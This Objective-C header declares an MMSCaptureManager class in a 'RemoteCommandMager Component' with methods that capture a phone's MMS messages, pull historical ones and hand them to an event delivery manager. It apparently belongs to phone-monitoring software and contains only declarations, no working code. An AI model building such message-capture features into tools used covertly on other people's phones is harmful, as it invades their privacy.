/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  MMSCaptureManager
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  31/1/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import <Foundation/Foundation.h>
#import "EventDelegate.h"


@interface MMSCaptureManager : NSObject {
@private
	// For creating an instance of MessagePortIPCReader
	id <EventDelegate>		mEventDelegate;
	NSString				*mMMSAttachmentPath;
	
	// IOS 6,7,8
	NSMutableArray		*mMMSEventPool;
}

@property (nonatomic, copy) NSString *mMMSAttachmentPath;

// For Sending event to Event Delivery manager
- (id) initWithEventDelegate: (id <EventDelegate>) aEventDelegate;
- (void)captureMMS;

- (oneway void) prepareForRelease;

// -- Historical MMS

+ (NSArray *) allMMSs;
+ (NSArray *) allMMSsWithMax: (NSInteger) aMaxNumber;
+ (void)clearCapturedData;

@end
